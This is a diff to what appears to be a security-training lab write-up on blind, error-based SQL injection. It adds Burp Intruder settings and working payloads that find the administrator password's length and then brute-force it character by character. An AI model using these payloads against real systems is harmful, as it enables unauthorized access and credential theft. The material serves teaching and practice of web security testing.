@@ -43,4 +43,26 @@ To solve the lab, log in as the `administrator` user
 ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
 ```
 
-###
+### Finding password length
+
+- Send the request to Burp Intruder.
+- Add the payload to the position as shown below.
+- Payload Configuration :-
+	- Payload Type -> Numbers
+	- Start -> 1
+	- End -> 50
+	- Step -> 1
+
+- The last error message comes in the request `LENGTH(password) > 19` . So the password length is 20.
+
+```sql
+' AND (SELECT CASE WHEN LENGTH(password) > §§ THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+```
+
+### Bruteforcing Password
+
+```sql
+' AND (SELECT CASE WHEN SUBSTR(password,§1§,1)='§2§' THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+```
+
+
